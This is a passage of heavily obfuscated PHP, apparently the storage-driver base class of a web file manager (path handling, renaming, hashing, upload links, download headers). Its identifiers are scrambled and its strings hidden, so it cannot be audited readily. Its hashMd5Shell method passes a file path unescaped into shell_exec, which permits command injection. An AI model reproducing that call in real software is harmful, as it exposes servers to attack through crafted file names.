$F×Ş°ø„Øà, $eğŒÛöëÖ, $C´È½ÃÙÜ²); } $E‘İÕ¹ÊØâ = 8 - $E¼º™ëãŞ…; goto Få³Š¤–î; bÎÕ°ÀÑ•ˆ: } else { goto fç»¡Èî°ª; CØ“ĞèŠÁ: $d¿¥›•°Î = $dœĞÍ¾Ñ­– ? 1 / $dœĞÍ¾Ñ­– : 1; $b°Üœš¡¡ = $Dè®ÇÖÄÈ¼ ? 1 / $Dè®ÇÖÄÈ¼ : 1; $C¹¤ØÃÁÊÜ = $d‚«Œ¤µ‚ ? 1 / $d‚«Œ¤µ‚ : 1; goto C®²§œª•Ì; C®²§œª•Ì: for ($bƒ×Œ›õñ˜ = 0; $bƒ×Œ›õñ˜ < $E Šƒ¡¬é±; ++$bƒ×Œ›õñ˜, $bËá°õËÍÙ += $aÈ˜Ñƒì¡ñ) { $d“›·Š´Ñî = fread($Eéùöå‹›î, $bÏïÆğÇïğ); if ($d“›·Š´Ñî === !1) { imagedestroy($D‚½Ô‹àèÎ); return !1; } $d¹‘÷Ÿ¶ = 0; for ($A¡ÅÈÖšš× = 0; $A¡ÅÈÖšš× < $Cë›‡¶ÈÛ; ++$A¡ÅÈÖšš×, $d¹‘÷Ÿ¶ += $eÑ¥Ó‘×Ï) { list(, $aÔÔ®‡ƒîÎ) = unpack($E×¹ÑÖƒÈÛ[1826], substr($d“›·Š´Ñî, $d¹‘÷Ÿ¶, $eÑ¥Ó‘×Ï) . $E×¹ÑÖƒÈÛ[1850]); $cáğ¨¯äî = $aÔÔ®‡ƒîÎ & $fŠ¸‚Ä¯; $D×ÓºÒß– = $aÔÔ®‡ƒîÎ & $dœĞÍ¾Ñ­–; $a³äğ¤‰—¤ = $aÔÔ®‡ƒîÎ & $Dè®ÇÖÄÈ¼; $cŠ«™İ–Œ§ = $aÔÔ®‡ƒîÎ & $d‚«Œ¤µ‚; $AóˆØ†·óõ = $a¥¿ËÇÜÛñ - (($cáğ¨¯äî << 7) - $cáğ¨¯äî) * $EÊó¯·í™•; $F×Ş°ø„Øà = (($D×ÓºÒß– << 8) - $D×ÓºÒß–) * $d¿¥›•°Î; $eğŒÛöëÖ = (($a³äğ¤‰—¤ << 8) - $a³äğ¤‰—¤) * $b°Üœš¡¡; $C´È½ÃÙÜ² = (($cŠ«™İ–Œ§ << 8) - $cŠ«™İ–Œ§) * $C¹¤ØÃÁÊÜ; imagesetpixel($D‚½Ô‹àèÎ, $A¡ÅÈÖšš×, $bËá°õËÍÙ, $AóˆØ†·óõ << 24 | $F×Ş°ø„Øà << 16 | $eğŒÛöëÖ << 8 | $C´È½ÃÙÜ²); } } imagealphablending($D‚½Ô‹àèÎ, !0); goto cÙóâŒ„Ø; aÇ‡»çŸğ£: $eÑ¥Ó‘×Ï = $E¼º™ëãŞ… >> 3; $a¥¿ËÇÜÛñ = $fŠ¸‚Ä¯ ? 127 : 0; $EÊó¯·í™• = $fŠ¸‚Ä¯ ? 1 / $fŠ¸‚Ä¯ : 1; goto CØ“ĞèŠÁ; fç»¡Èî°ª: $D‚½Ô‹àèÎ = imagecreatetruecolor($Cë›‡¶ÈÛ, $E Šƒ¡¬é±); imagealphablending($D‚½Ô‹àèÎ, !1); if ($fŠ¸‚Ä¯) { imagesavealpha($D‚½Ô‹àèÎ, !0); } goto aÇ‡»çŸğ£; cÙóâŒ„Ø: } return $D‚½Ô‹àèÎ; goto D™®Á«èå·; D™®Á«èå·: } } goto eã¬–½œô; FõØĞÄ¶¯Á: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $aæÜÒ¡Öö¡ =& $_SERVER[í™]; $this->objectDriver = array($aæÜÒ¡Öö¡[57], $aæÜÒ¡Öö¡[58], $aæÜÒ¡Öö¡[59], $aæÜÒ¡Öö¡[60], $aæÜÒ¡Öö¡[61], $aæÜÒ¡Öö¡[62], $aæÜÒ¡Öö¡[63], $aæÜÒ¡Öö¡[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($cÙ‚­Ì®°Ù) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($cÙ‚­Ì®°Ù, $_SERVER[í™][8]); } return $cÙ‚­Ì®°Ù; } public function getPathName($F™•çìª¸») { return $F™•çìª¸»; } public function iconvApp($eñùßğ¥Éë) { return $eñùßğ¥Éë; } public function iconvSystem($e¼…ÆæåŒˆ) { return $e¼…ÆæåŒˆ; } public function iconvTo($aÓ¹²°îĞ», $B•Ÿ“Ğ, $f•Ù“í©‘£) { goto b“¹ƒ—ª‘”; díçÑ§–¤Ê: return $aÖæá×ë‹”; goto CÊÔØİÇğ; D²®æîåŞÃ: $aÖæá×ë‹” = $aÖæá×ë‹” ? $aÖæá×ë‹” : $aÓ¹²°îĞ»; if (strstr($aÖæá×ë‹”, $AËî·¾¼Â‚[69])) { $aÖæá×ë‹” = str_replace($AËî·¾¼Â‚[69], $AËî·¾¼Â‚[70], $aÖæá×ë‹”); } $f¹©Æ›Îîë[$B•Ÿ“Ğ . $AËî·¾¼Â‚[66] . $f•Ù“í©‘£ . $AËî·¾¼Â‚[67] . $aÓ¹²°îĞ»] = $aÖæá×ë‹”; goto fõ…•®ñ»À; b“¹ƒ—ª‘”: $AËî·¾¼Â‚ =& $_SERVER[í™]; if (!$aÓ¹²°îĞ» || !function_exists($AËî·¾¼Â‚[65])) { return $aÓ¹²°îĞ»; } static $f¹©Æ›Îîë = array(); goto c¿ã•Æ›Èº; c¿ã•Æ›Èº: $Bõæ¶½¿æâ = $B•Ÿ“Ğ . $AËî·¾¼Â‚[66] . $f•Ù“í©‘£ . $AËî·¾¼Â‚[67] . $aÓ¹²°îĞ»; if (isset($f¹©Æ›Îîë[$Bõæ¶½¿æâ])) { return $f¹©Æ›Îîë[$Bõæ¶½¿æâ]; } if (function_exists($AËî·¾¼Â‚[68])) { $aÖæá×ë‹” = @mb_convert_encoding($aÓ¹²°îĞ», $f•Ù“í©‘£, $B•Ÿ“Ğ); } else { $aÖæá×ë‹” = @iconv($B•Ÿ“Ğ, $f•Ù“í©‘£, $aÓ¹²°îĞ»); } goto D²®æîåŞÃ; fõ…•®ñ»À: $f¹©Æ›Îîë[$f•Ù“í©‘£ . $AËî·¾¼Â‚[66] . $B•Ÿ“Ğ . $AËî·¾¼Â‚[67] . $aÓ¹²°îĞ»] = $aÓ¹²°îĞ»; $f¹©Æ›Îîë[$f•Ù“í©‘£ . $AËî·¾¼Â‚[66] . $B•Ÿ“Ğ . $AËî·¾¼Â‚[67] . $aÖæá×ë‹”] = $aÓ¹²°îĞ»; $f¹©Æ›Îîë[$B•Ÿ“Ğ . $AËî·¾¼Â‚[66] . $f•Ù“í©‘£ . $AËî·¾¼Â‚[67] . $aÖæá×ë‹”] = $aÖæá×ë‹”; goto díçÑ§–¤Ê; CÊÔØİÇğ: } public function getPathInner($a–ª“õØâ) { $a´¥ÒƒÌÊ = IO::init($a–ª“õØâ); return $a´¥ÒƒÌÊ->path; } public function getPathOuter($aÕÒä§Ç¿·) { $E¨ì‚ÁÍò =& $_SERVER[í™]; $aĞ¯»çÄ® = strlen(trim($this->pathBase, $E¨ì‚ÁÍò[8])); $aÕÒä§Ç¿· = substr(trim($aÕÒä§Ç¿·, $E¨ì‚ÁÍò[8]), $aĞ¯»çÄ®); return $this->pathDriver . $E¨ì‚ÁÍò[8] . ltrim($aÕÒä§Ç¿·, $E¨ì‚ÁÍò[8]); } public function isParentOf($CÇˆÚ„™ß¹, $e¸ùÒ‰İçá) { $dÃŸ”ä¡™Ô =& $_SERVER[í™]; $CÇˆÚ„™ß¹ = rtrim(strtolower($CÇˆÚ„™ß¹), $dÃŸ”ä¡™Ô[8]) . $dÃŸ”ä¡™Ô[8]; $e¸ùÒ‰İçá = rtrim(strtolower($e¸ùÒ‰İçá), $dÃŸ”ä¡™Ô[8]) . $dÃŸ”ä¡™Ô[8]; $dÊŒ½İô‰á = strpos($e¸ùÒ‰İçá, $CÇˆÚ„™ß¹) === 0; return $dÊŒ½İô‰á; } public function getType() { $D“Ô§ùŞñ =& $_SERVER[í™]; $Bº–Ç§Ğ«ö = str_replace($D“Ô§ùŞñ[71], $D“Ô§ùŞñ[33], get_class($this)); return strtolower($Bº–Ç§Ğ«ö); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($cÕÒÔŒœã, $DŠ™¯½áô¤) { $cøùÄö—«‡ =& $_SERVER[í™]; $c‘°Â‰à‡ = rtrim($cÕÒÔŒœã, $cøùÄö—«‡[8]) . $cøùÄö—«‡[8] . $DŠ™¯½áô¤; $Dëä¼î˜¤Ë = $this->exist($c‘°Â‰à‡); return $Dëä¼î˜¤Ë ? $c‘°Â‰à‡ : !1; } public function setModifyTime($A±ŠˆÔç, $c©¿‡±¤¹ã = '') { } public function renameObject($d¿ìğÉ´ˆÊ, $C´‡ÍºùÅó) { goto DáĞ«îÏˆ; DáĞ«îÏˆ: $bƒğÒ…·¸Í =& $_SERVER[í™]; $FîÁ™Êó‹ = $C´‡ÍºùÅó; Hook::trigger($bƒğÒ…·¸Í[72], $this, $d¿ìğÉ´ˆÊ, $this, $this->pathFather($d¿ìğÉ´ˆÊ) . $C´‡ÍºùÅó); goto FŒ¥—Ø„¾¯; cçÚ‰à£¦©: return $A—”ñ®‹Ã… ? $C´‡ÍºùÅó : !1; goto FæÔö¹éèÃ; FŒ¥—Ø„¾¯: $d¿ìğÉ´ˆÊ = $this->getPathOuter($d¿ìğÉ´ˆÊ); $C´‡ÍºùÅó = $this->pathFather($d¿ìğÉ´ˆÊ) . $C´‡ÍºùÅó; if (IO::isFile($d¿ìğÉ´ˆÊ)) { $A—”ñ®‹Ã… = IO::copy($d¿ìğÉ´ˆÊ, $this->pathFather($d¿ìğÉ´ˆÊ), REPEAT_RENAME_FOLDER, $FîÁ™Êó‹); if ($A—”ñ®‹Ã…) { IO::remove($d¿ìğÉ´ˆÊ); } } else { $A—”ñ®‹Ã… = IO::mkdir($C´‡ÍºùÅó); if (!$A—”ñ®‹Ã…) { return !1; } $CÆ£´³¬±ô = IO::listPath($d¿ìğÉ´ˆÊ, !0); $dË¡İ¹êèÙ = array_merge($CÆ£´³¬±ô[$bƒğÒ…·¸Í[73]], $CÆ£´³¬±ô[$bƒğÒ…·¸Í[74]]); foreach ($dË¡İ¹êèÙ as $BÂßÑ İ°ã) { IO::move($BÂßÑ İ°ã[$bƒğÒ…·¸Í[75]], $C´‡ÍºùÅó, REPEAT_RENAME_FOLDER); } IO::remove($d¿ìğÉ´ˆÊ); } goto cçÚ‰à£¦©; FæÔö¹éèÃ: } public function tempFile($cÀ¡Ò’ŸÆø = '', $e†•ÂĞ‰¸§ = '') { goto CÀÄ…ã»•; A«í†°¥Ø: $dË»ï‰©¦õ = $D¦²¥ßİ£³ . $cÀ¡Ò’ŸÆø; @touch($dË»ï‰©¦õ); if ($e†•ÂĞ‰¸§) { file_put_contents($dË»ï‰©¦õ, $e†•ÂĞ‰¸§); } goto eÓá™‡¶·Ñ; eÓá™‡¶·Ñ: return $dË»ï‰©¦õ; goto F¥¥ŠóˆÌó; CÀÄ…ã»•: if (!$cÀ¡Ò’ŸÆø) { $cÀ¡Ò’ŸÆø = rand_string(15); } $D¦²¥ßİ£³ = TEMP_FILES . rand_string(15) . $_SERVER[í™][8]; @mkdir($D¦²¥ßİ£³, 511, !0); goto A«í†°¥Ø; F¥¥ŠóˆÌó: } public function tempFileRemve($C‡˜™óëâ²) { @unlink($C‡˜™óëâ²); @rmdir($this->pathFather($C‡˜™óëâ²)); } public function mkfile($a±³Íˆò«ğ, $A‰’´Æ³ëî = '', $d¡èŠã¦ = REPEAT_RENAME) { } public function mkdir($A‹‰Ü¦ÁŠ½, $b³ÛÓ­ëÔ‹ = REPEAT_SKIP) { } public function delFile($B‰í¿èİø) { } public function delFolder($c®•Úİ»Ø˜) { } public function copyFile($DíÂ½£†õ, $cÒ„Ïº¨·¤) { } public function moveFile($d—æ™¢„š‰, $CÚÕ¡ÆªŒ) { } public function remove($aÜİÎÇ‡) { if ($this->isFile($aÜİÎÇ‡)) { return $this->delFile($aÜİÎÇ‡); } return $this->delFolder($aÜİÎÇ‡); } public function rename($aå‘Ö‚ÆÀğ, $FÖâÕ‡Ïã) { } public function exist($c©¸ŸË—ë­) { } public function findByHash($Dçß¸¶ğÓ– = '', $B™ºöªâÛË = '') { return !1; } public function isFile($fŠ¾‰°Ùôğ) { } public function isFolder($eğÄƒ…Ûˆ) { } public function size($B šïÎ Ğ) { } public function info($c±Ò¸®²›’) { } public function infoSimple($BãÓº­ËÃ) { return $this->info($BãÓº­ËÃ); } public function infoAuth($AŸ‡£Îé•ª) { return $this->info($AŸ‡£Îé•ª); } public function infoFull($bÒ‘´äÇ¹) { return $this->info($bÒ‘´äÇ¹); } public function infoWithChildren($e¼‡Âƒ‚š) { $f˜îÂã‡³ =& $_SERVER[í™]; static $cŒÃ­Úï¸ = array(); if (isset($cŒÃ­Úï¸[$e¼‡Âƒ‚š])) { return $cŒÃ­Úï¸[$e¼‡Âƒ‚š]; } $c„¯Æµãùç = $this->info($e¼‡Âƒ‚š); if ($c„¯Æµãùç && $c„¯Æµãùç[$f˜îÂã‡³[29]] == $f˜îÂã‡³[76]) { $f¢·÷Ş†» = array($f˜îÂã‡³[77] => 0, $f˜îÂã‡³[78] => 0, $f˜îÂã‡³[79] => 0); $this->infoChildren($e¼‡Âƒ‚š, $f¢·÷Ş†»); $c„¯Æµãùç[$f˜îÂã‡³[77]] = $f¢·÷Ş†»[$f˜îÂã‡³[77]]; $c„¯Æµãùç[$f˜îÂã‡³[80]] = array($f˜îÂã‡³[81] => $f¢·÷Ş†»[$f˜îÂã‡³[78]], $f˜îÂã‡³[82] => $f¢·÷Ş†»[$f˜îÂã‡³[79]]); $cŒÃ­Úï¸[$e¼‡Âƒ‚š] = $c„¯Æµãùç; } return $c„¯Æµãùç; } public function listPath($C‡ˆã•ªÄö, $DàÒÅ¶æÔ = false) { } public function has($cÎëÏ¯‹½Ó, $cœÒš‚Ú¿ = false, $b‰‘…ÛğÏ¾ = false) { } public function canRead($d¾×«ÒÓ) { } public function canWrite($F¢ØÔÖš´‡) { } public function getContent($cŠƒ’•¥–Î) { } public function setContent($C¼Õƒã¢ß, $cÔÁŒ‡Š¡µ = '') { } protected function infoChildren($B±Ë—Ì×Ñ, &$c¹†¦½è¹Ç) { $C…˜çïÕñ =& $_SERVER[í™]; check_abort(); $e¼Áë­¯ï· = $this->listPath($B±Ë—Ì×Ñ, !0); $e¼Áë­¯ï· = array_merge($e¼Áë­¯ï·[$C…˜çïÕñ[74]], $e¼Áë­¯ï·[$C…˜çïÕñ[73]]); foreach ($e¼Áë­¯ï· as $EíÂÜ„ƒÑù) { if ($EíÂÜ„ƒÑù[$C…˜çïÕñ[29]] == $C…˜çïÕñ[76]) { $c¹†¦½è¹Ç[$C…˜çïÕñ[79]]++; $aÙÖËƒ±›× = $this->getPathInner($EíÂÜ„ƒÑù[$C…˜çïÕñ[75]]); $this->infoChildren($aÙÖËƒ±›×, $c¹†¦½è¹Ç); } else { $c¹†¦½è¹Ç[$C…˜çïÕñ[78]]++; $c¹†¦½è¹Ç[$C…˜çïÕñ[77]] += $EíÂÜ„ƒÑù[$C…˜çïÕñ[77]]; } } } public function fileSubstr($FøÌ³­İôĞ, $aÀÅ‘ç¬Óğ, $bÙàÔçàŠç) { } public function listAll($bğÌÀğöš) { } public function upload($C¶Ğ­Õ¥Š¬, $Cæ¢“ØõÇÍ, $DÖí¢¹±¬ç = false, $BÒ±çƒäÖ = REPEAT_REPLACE) { } public function uploadFileByID($bŒ¡Ë½ ò³, $B˜Ñô‘†ñà, $CãÊ­Î…å­) { } public function uploadFileByPath($AªàÀ±–§‚, $Aë´ßíŒ§Œ, $BéÎÂá™ƒ = array()) { } public function isUploadServer() { $cŠ´µùòñ =& $_SERVER[í™]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $cŠ´µùòñ[83]) { return !0; } return $GLOBALS[$cŠ´µùòñ[6]][$cŠ´µùòñ[84]][$cŠ´µùòñ[85]]; } public function isFileOutServer() { $FôÈƒÊÕË =& $_SERVER[í™]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $FôÈƒÊÕË[83]) { return !0; } return $GLOBALS[$FôÈƒÊÕË[6]][$FôÈƒÊÕË[84]][$FôÈƒÊÕË[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($a°ÈÂ‰„Å) { $bÑ¯áôÌ¡Ç =& $_SERVER[í™]; if (!$this->isCdnHost()) { return $a°ÈÂ‰„Å; } return str_replace(trim(get_url_root($a°ÈÂ‰„Å), $bÑ¯áôÌ¡Ç[8]), trim($this->cdnHost, $bÑ¯áôÌ¡Ç[8]), $a°ÈÂ‰„Å); } public function uploadLink($bô‡˜‹¨¬‹, $bØàÖ÷œô­ = 0) { goto dàá¦ŒïŞµ; a“ù›Íõ¨ğ: if ($aôšŞ¶’Î¶) { $aôšŞ¶’Î¶[$a·±ÈÉ°¿[89]] = $bô‡˜‹¨¬‹; $aôšŞ¶’Î¶[$a·±ÈÉ°¿[90]] = $Aƒ±«¥‡ÜĞ; } return $aôšŞ¶’Î¶; goto dÅÜšìœ‘›; dàá¦ŒïŞµ: $a·±ÈÉ°¿ =& $_SERVER[í™]; if ($this->isUploadServer()) { return; } $Aƒ±«¥‡ÜĞ = $this->getType(); goto BÅ©‹ÃäÜ; d˜×ğÊó¶õ: $c´ÊÂ‘öå = $bØàÖ÷œô­ <= $Eá¥Úà¼ ? $a·±ÈÉ°¿[87] : $a·±ÈÉ°¿[88]; $fŸÌ©‹î† = (!$bØàÖ÷œô­ ? 1 : ceil($bØàÖ÷œô­ / pow(1024, 3))) * 3600 * 4; $aôšŞ¶’Î¶ = $this->{$c´ÊÂ‘öå}($bô‡˜‹¨¬‹, $fŸÌ©‹î†); goto a“ù›Íõ¨ğ; BÅ©‹ÃäÜ: if (!in_array($Aƒ±«¥‡ÜĞ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Eá¥Úà¼ = 1024 * 1024 * 10; goto d˜×ğÊó¶õ; dÅÜšìœ‘›: } public function uploadFormData($Dá¿ø¸ù Ü, $d©ÂÀÈæÚ = 3600) { } public function multiUploadFormData($F‚ÆˆÏ¼, $Câ…õÃ» = 3600) { } public function download($F‘åÌ¨¿ñ, $B“îÉõÚÇ) { } public function ext($d¨Ôš“Ò©µ) { $aã­ŠŸ¸´— =& $_SERVER[í™]; if (strpos($d¨Ôš“Ò©µ, $aã­ŠŸ¸´—[8]) === -1) { $a“‡ÂğÙÇŞ = $d¨Ôš“Ò©µ; } else { $a“‡ÂğÙÇŞ = $this->pathThis($d¨Ôš“Ò©µ); } $b®·²ê›‡ = $aã­ŠŸ¸´—[33]; if (strstr($a“‡ÂğÙÇŞ, $aã­ŠŸ¸´—[91])) { $b®·²ê›‡ = substr($a“‡ÂğÙÇŞ, strrpos($a“‡ÂğÙÇŞ, $aã­ŠŸ¸´—[91]) + 1); $b®·²ê›‡ = strtolower($b®·²ê›‡); } if (strlen($b®·²ê›‡) > 3 && preg_match($aã­ŠŸ¸´—[92], $b®·²ê›‡, $DôÌ‰Ëà§…)) { $b®·²ê›‡ = $aã­ŠŸ¸´—[33]; } return $b®·²ê›‡; } public function pathThis($bàó®ƒ¹®Ÿ) { $cíö†Ï°¡Ù =& $_SERVER[í™]; $bàó®ƒ¹®Ÿ = str_replace($cíö†Ï°¡Ù[93], $cíö†Ï°¡Ù[8], rtrim($bàó®ƒ¹®Ÿ, $cíö†Ï°¡Ù[8])); $EĞÏÍ¹‹ÀÛ = strrpos($bàó®ƒ¹®Ÿ, $cíö†Ï°¡Ù[8]); if ($EĞÏÍ¹‹ÀÛ === !1) { return $bàó®ƒ¹®Ÿ; } return substr($bàó®ƒ¹®Ÿ, $EĞÏÍ¹‹ÀÛ + 1); } public function pathFather($AãÔç‘âÎê) { $a”¢Üµœˆ‚ =& $_SERVER[í™]; $AãÔç‘âÎê = str_replace($a”¢Üµœˆ‚[93], $a”¢Üµœˆ‚[8], rtrim($AãÔç‘âÎê, $a”¢Üµœˆ‚[8])); $aÊ‚±Ùãó = strrpos($AãÔç‘âÎê, $a”¢Üµœˆ‚[8]); if ($aÊ‚±Ùãó === !1) { return $a”¢Üµœˆ‚[33]; } return substr($AãÔç‘âÎê, 0, $aÊ‚±Ùãó + 1); } public function hashSimple($f§¬‡¿±’ê) { goto CÜÅµ™Ã’ø; B‰ØÁğÔµã: $cîØŞœíİ‹ .= $this->fileSubstr($f§¬‡¿±’ê, $E‘¥î˜Ú” - $Bºİù×õ¨, $Bºİù×õ¨); return md5($cîØŞœíİ‹) . $E‘¥î˜Ú”; goto cù¿ë‘†·Ô; cñã„£…°‘: $cÊ¯×´©ĞÑ = intval($E‘¥î˜Ú” / $c­ğŠå†Ÿ); $cîØŞœíİ‹ = $f¹Ÿ×Ä—Êå[33]; for ($a‚õŠÔË = 0; $a‚õŠÔË < $c­ğŠå†Ÿ; $a‚õŠÔË++) { $cîØŞœíİ‹ .= $this->fileSubstr($f§¬‡¿±’ê, $cÊ¯×´©ĞÑ * $a‚õŠÔË, $Bºİù×õ¨); } goto B‰ØÁğÔµã; f¦ŸÀŸŒø: $Bºİù×õ¨ = 200; $c­ğŠå†Ÿ = 50; if ($E‘¥î˜Ú” <= $Bºİù×õ¨ * $c­ğŠå†Ÿ) { return $this->hashMd5($f§¬‡¿±’ê) . $E‘¥î˜Ú”; } goto cñã„£…°‘; CÜÅµ™Ã’ø: $f¹Ÿ×Ä—Êå =& $_SERVER[í™]; if (!$f§¬‡¿±’ê) { return md5($f¹Ÿ×Ä—Êå[33]); } $E‘¥î˜Ú” = $this->size($f§¬‡¿±’ê); goto f¦ŸÀŸŒø; cù¿ë‘†·Ô: } public static $md5Cache = array(); public function hashMd5($D ‰„¹éšÏ) { $D ‰„¹éšÏ = $this->iconvSystem($D ‰„¹éšÏ); if (isset(self::$md5Cache[$D ‰„¹éšÏ])) { return self::$md5Cache[$D ‰„¹éšÏ]; } self::$md5Cache[$D ‰„¹éšÏ] = $this->hashMd5Shell($D ‰„¹éšÏ); if (!self::$md5Cache[$D ‰„¹éšÏ]) { self::$md5Cache[$D ‰„¹éšÏ] = @md5_file($D ‰„¹éšÏ); } return self::$md5Cache[$D ‰„¹éšÏ]; } private function hashMd5Shell($CÕ×Š¯ñËÌ) { goto eÑô¢†Ğ; eå†Ó‡‰Õò: $D×ìÈóƒ™Š = shell_exec($fìÂß½‚¸Ú . "\40\x22{$CÕ×Š¯ñËÌ}\42"); $D×ìÈóƒ™Š = str_replace($f©ùÙŞ¦Ø•[100], $f©ùÙŞ¦Ø•[33], $D×ìÈóƒ™Š); return substr($D×ìÈóƒ™Š, 0, 32); goto Eè–øë á£; A©í¬ÜÙ˜: $fìÂß½‚¸Ú = Cache::get($f©ùÙŞ¦Ø•[97]); if (!$fìÂß½‚¸Ú) { $E¦¿¨†ÆÄ‰ = BASIC_PATH . $f©ùÙŞ¦Ø•[98]; $e§ÅËÁÏòÀ = md5_file($E¦¿¨†ÆÄ‰); $fìÂß½‚¸Ú = $f©ùÙŞ¦Ø•[99]; foreach ($FëÇ­ˆî“ as $b¾»¬Áƒé) { $D×ìÈóƒ™Š = shell_exec($b¾»¬Áƒé . "\x20\x22{$E¦¿¨†ÆÄ‰}\42"); if ($D×ìÈóƒ™Š && substr(trim($D×ìÈóƒ™Š), 0, 32) == $e§ÅËÁÏòÀ) { $fìÂß½‚¸Ú = $b¾»¬Áƒé; break; } } Cache::set($f©ùÙŞ¦Ø•[97], $fìÂß½‚¸Ú, 3600); } if ($fìÂß½‚¸Ú == $f©ùÙŞ¦Ø•[99]) { return !1; } goto eå†Ó‡‰Õò; eÑô¢†Ğ: $f©ùÙŞ¦Ø• =& $_SERVER[í™]; if (!function_exists($f©ùÙŞ¦Ø•[94])) { return !1; } $FëÇ­ˆî“ = array($f©ùÙŞ¦Ø•[95], $f©ùÙŞ¦Ø•[96]); goto A©í¬ÜÙ˜; Eè–øë á£: } public function link($b÷ƒº¾Œ‹Ò) { return $b÷ƒº¾Œ‹Ò; } public function fileOut($b…ùô¾Ëõä, $E®™…âéÍ = false, $BáÈêÆ”‡„ = false, $A×œ¶¯Áº = '') { goto C·İ¿ÜØ; BÓ¤ƒÑ„”: $E‡Ñ¸¯¨‡ = get_file_mime($F°§ÈŒØÕ); if (strstr($E‡Ñ¸¯¨‡, $ağ‘†ç¨‚[114])) { $E‡Ñ¸¯¨‡ = $E‡Ñ¸¯¨‡ . $ağ‘†ç¨‚[115]; } if ($E®™…âéÍ === !1 && !mime_support($E‡Ñ¸¯¨‡)) { $E®™…âéÍ = !0; $E‡Ñ¸¯¨‡ = $ağ‘†ç¨‚[116]; } goto E„š¹âôÑ¥; EˆÒ«‚¼·: if (in_array($F°§ÈŒØÕ, array($ağ‘†ç¨‚[108], $ağ‘†ç¨‚[109], $ağ‘†ç¨‚[110], $ağ‘†ç¨‚[111]))) { $F°§ÈŒØÕ = $ağ‘†ç¨‚[112]; } if (!$A×œ¶¯Áº) { $A×œ¶¯Áº = md5($fĞ•¾ĞÓ–æ . $this->hashSimple($b…ùô¾Ëõä)); } $A×œ¶¯Áº = $ağ‘†ç¨‚[113] . $A×œ¶¯Áº . $ağ‘†ç¨‚[113]; goto BÓ¤ƒÑ„”; Cé©Å¶Ê™: @ob_end_clean(); set_timeout(); $aª°öÛ˜ø = $this->infoFull($b…ùô¾Ëõä); goto B¬Ş¿åâÏ…; d¿ŠÅòåé: $D¾Íš¢âÉ¤ = strtolower($_SERVER[$ağ‘†ç¨‚[139]]); if ($FÎµõ¾ø« && $D¾Íš¢âÉ¤ && $F Ô‘•Éğ ) { if (strstr($D¾Íš¢âÉ¤, $ağ‘†ç¨‚[140])) { header($ağ‘†ç¨‚[141] . $b…ùô¾Ëõä); } else { if (strstr($D¾Íš¢âÉ¤, $ağ‘†ç¨‚[142])) { header($ağ‘†ç¨‚[143] . $b…ùô¾Ëõä); } else { if (strstr($D¾Íš¢âÉ¤, $ağ‘†ç¨‚[144])) { header($ağ‘†ç¨‚[145] . $b…ùô¾Ëõä); } } } if ($b‹ÂÀÆ„ö˜) { header($ağ‘†ç¨‚[146] . $b‹ÂÀÆ„ö˜); } return; } if (isset($_SERVER[$ağ‘†ç¨‚[147]])) { if (preg_match($ağ‘†ç¨‚[148], $_SERVER[$ağ‘†ç¨‚[147]], $bé½Ø£´ĞŸ)) { $EÉÛÙ°»Ñ¹ = intval($bé½Ø£´ĞŸ[1]); if (!empty($bé½Ø£´ĞŸ[2])) { $fÅÙÙìæ¿ = intval($bé½Ø£´ĞŸ[2]); } } header($ağ‘†ç¨‚[149]); header("\x43\x6f\x6e\164\145\x6e\164\x2d\x52\141\156\x67\145\72\x20\x62\171\x74\145\x73\40{$EÉÛÙ°»Ñ¹}\55{$fÅÙÙìæ¿}\57" . $CÇ„¯§–ó); } else { header($ağ‘†ç¨‚[150]); } goto BÍ™¶Ã£—; Eê÷ç ˜¼Æ: header($ağ‘†ç¨‚[132] . $fĞ•¾ĞÓ–æ . $ağ‘†ç¨‚[124]); header($ağ‘†ç¨‚[133] . $Aİ¡¦¯›Á); header($ağ‘†ç¨‚[134]); goto b¢Ô»İèŒ; Ağøœˆ¨•…: header($ağ‘†ç¨‚[121]); header($ağ‘†ç¨‚[122] . $E‡Ñ¸¯¨‡); header($ağ‘†ç¨‚[123] . gmdate($ağ‘†ç¨‚[106], time() + 3600 * 24 * 30) . $ağ‘†ç¨‚[124]); goto BÁ·½Ôç½©; BÁ·½Ôç½©: header($ağ‘†ç¨‚[125]); header($ağ‘†ç¨‚[126]); header($ağ‘†ç¨‚[127]); goto cšØƒ½ÉîË; E„š¹âôÑ¥: $EÕ¿¶ˆè¹ = rawurlencode($Aİ¡¦¯›Á); $EÕ¿¶ˆè¹ = $ağ‘†ç¨‚[113] . $EÕ¿¶ˆè¹ . $ağ‘†ç¨‚[117] . $EÕ¿¶ˆè¹; if ($E®™…âéÍ) { header($ağ‘†ç¨‚[118]); header($ağ‘†ç¨‚[119] . $EÕ¿¶ˆè¹); } else { header($ağ‘†ç¨‚[120] . $EÕ¿¶ˆè¹); } goto Ağøœˆ¨•…; AğÛŒ‹‹ª: $EÉÛÙ°»Ñ¹ = 0; $fÅÙÙìæ¿ = $CÇ„¯§–ó - 1; $F°§ÈŒØÕ = $this->ext($Aİ¡¦¯›Á); goto EˆÒ«‚¼·; C±Ëª…Ÿ«: $FÎµõ¾ø« = $this->getType() == $ağ‘†ç¨‚[102]; $F Ô‘•Éğ  = $GLOBALS[$ağ‘†ç¨‚[6]][$ağ‘†ç¨‚[84]][$ağ‘†ç¨‚[103]][$ağ‘†ç¨‚[104]]; $b‹ÂÀÆ„ö˜ = (double) $GLOBALS[$ağ‘†ç¨‚[6]][$ağ‘†ç¨‚[84]][$ağ‘†ç¨‚[103]][$ağ‘†ç¨‚[105]] * 1024 * 1024; goto Cé©Å¶Ê™; B¬Ş¿åâÏ…: $CÇ„¯§–ó = $aª°öÛ˜ø[$ağ‘†ç¨‚[77]]; $fĞ•¾ĞÓ–æ = gmdate($ağ‘†ç¨‚[106], $aª°öÛ˜ø[$ağ‘†ç¨‚[107]]); $Aİ¡¦¯›Á = $BáÈêÆ”‡„ ? $BáÈêÆ”‡„ : $this->iconvApp($aª°öÛ˜ø[$ağ‘†ç¨‚[28]]); goto AğÛŒ‹‹ª; F¡½áŞ¹é‚: if ($b‹ÂÀÆ„ö˜) { $AÏ³íÏ‹ = intval(1000 * 